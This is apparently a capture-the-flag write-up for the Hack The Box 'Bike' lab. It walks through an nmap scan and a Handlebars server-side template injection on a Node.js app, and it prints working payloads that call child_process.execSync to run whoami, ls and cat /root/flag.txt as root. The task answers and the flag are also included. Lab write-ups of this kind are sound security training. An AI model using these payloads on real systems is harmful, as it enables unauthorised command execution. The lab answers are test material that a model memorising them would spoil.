Spawn the VM and connect the VPN
10.129.97.64


### TASK 1

What TCP ports does nmap identify as open? Answer with a list of ports seperated by commas with no spaces, from low to high.

```
└─# nmap -sS -n -Pn -sV --osscan-guess 10.129.97.64 --top-ports 20
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-03 03:13 EST
Nmap scan report for 10.129.97.64
Host is up (0.22s latency).

PORT     STATE  SERVICE       VERSION
21/tcp   closed ftp
22/tcp   open   ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
23/tcp   closed telnet
25/tcp   closed smtp
53/tcp   closed domain
80/tcp   open   http          Node.js (Express middleware)
110/tcp  closed pop3
111/tcp  closed rpcbind
135/tcp  closed msrpc
139/tcp  closed netbios-ssn
143/tcp  closed imap
443/tcp  closed https
445/tcp  closed microsoft-ds
993/tcp  closed imaps
995/tcp  closed pop3s
1723/tcp closed pptp
3306/tcp closed mysql
3389/tcp closed ms-wbt-server
5900/tcp closed vnc
8080/tcp closed http-proxy
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.30 seconds
```

Answer: 22,80

### TASK 2

What software is running the service listening on the http/web port identified in the first question?

Answer: Node.js

### TASK 3

What is the name of the Web Framework according to Wappalyzer?

![[HTB-Bike-Image01.png]]

Answer: Express

### TASK 4

What is the name of the vulnerability we test for by submitting {{7*7}}?

https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md

Answer: Server side template injection

### TASK 5

What is the templating engine being used within Node.JS?

```
Error: Parse error on line 1:
{{7*7}}
--^
Expecting 'ID', 'STRING', 'NUMBER', 'BOOLEAN', 'UNDEFINED', 'NULL', 'DATA', got 'INVALID'
    at Parser.parseError (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:268:19)
    at Parser.parse (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:337:30)
    at HandlebarsEnvironment.parse (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/base.js:46:43)
    at compileInput (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:515:19)
    at ret (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:524:18)
    at router.post (/root/Backend/routes/handlers.js:14:16)
    at Layer.handle [as handle_request] (/root/Backend/node_modules/express/lib/router/layer.js:95:5)
    at next (/root/Backend/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/root/Backend/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/root/Backend/node_modules/express/lib/router/layer.js:95:5)
```

Answer: handlebars

### TASK 6

What is the name of the BurpSuite tab used to encode text?

https://portswigger.net/burp/documentation/desktop/tools/decoder

Answer: decoder

### TASK 7

In order to send special characters in our payload in an HTTP request, we'll encode the payload. What type of encoding do we use?

Answer: URL

### TASK 8

When we use a payload from HackTricks to try to run system commands, we get an error back. What is "not defined" in the response error?

Using https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs, get the Handlebars (NodeJS)SSTI exploit and URL encode it.

Use the burpsuite proxy to prepare the request and replace the query with the URL encdoed payload from hacktricks.xyz.

```
ReferenceError: require is not defined
    at Function.eval (eval at <anonymous> (eval at createFunctionContext (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:254:23)), <anonymous>:3:1)
    at Function.<anonymous> (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/helpers/with.js:10:25)
    at eval (eval at createFunctionContext (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:254:23), <anonymous>:5:37)
    at prog (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/runtime.js:221:12)
    at execIteration (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/helpers/each.js:51:19)
    at Array.<anonymous> (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/helpers/each.js:61:13)
    at eval (eval at createFunctionContext (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:254:23), <anonymous>:12:31)
    at prog (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/runtime.js:221:12)
    at Array.<anonymous> (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/helpers/with.js:22:14)
    at eval (eval at createFunctionContext (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:254:23), <anonymous>:12:34)
```

Answer: require

### TASK 9

What variable is the name of the top-level scope in Node.JS?

https://nodejs.org/api/globals.html

Answer: global

### TASK 10

By exploiting this vulnerability, we get command execution as the user that the webserver is running as. What is the name of that user?

https://nodejs.org/api/globals.html#require
https://nodejs.org/api/process.html#process

Encode the request with 
```
{{this.push "return process;"}}
```
 instead of 
 
```
 {{this.push "return require('child_process').exec('whoami');"}}
```

and look in the response of Burpsuite

```
       We will contact you at:       e
      2
      [object Object]
        function Function() { [native code] }
          2
        [object Object]
            [object process]
```

https://nodejs.org/api/process.html
https://nodejs.org/api/process.html#processmainmodule
https://www.geeksforgeeks.org/node-js-process-mainmodule-property/

Replace the exploit line with
```
{{this.push "return process.mainModule;"}}
```
 URL encode it and run it
```
       We will contact you at:       e
      2
      [object Object]
        function Function() { [native code] }
          2
        [object Object]
        [object Object]
```

noting the extra object at the end.

Modify the payload to add
```
{{this.push "return process.mainModule.require('child_process');"}}
```

```
       We will contact you at:       e
      2
      [object Object]
        function Function() { [native code] }
          2
        [object Object]
        [object Object]
```

No errors and the code ran, add the command for whoami and run it
```
{{this.push "return process.mainModule.require('child_process').execSync('whoami');"}}
```

```
       We will contact you at:       e
      2
      [object Object]
        function Function() { [native code] }
2
        [object Object]
            root
```

We are running as root.

Answer: root

### SUBMIT FLAG

Submit root flag

Modify the payload to find the flag

{{this.push "return process.mainModule.require('child_process').execSync('pwd');"}}
{{this.push "return process.mainModule.require('child_process').execSync('ls');"}}
{{this.push "return process.mainModule.require('child_process').execSync('ls /root');"}}
{{this.push "return process.mainModule.require('child_process').execSync('cat /root/flag.txt');"}}

Answer: 6b258d726d287462d60c103d0142a81c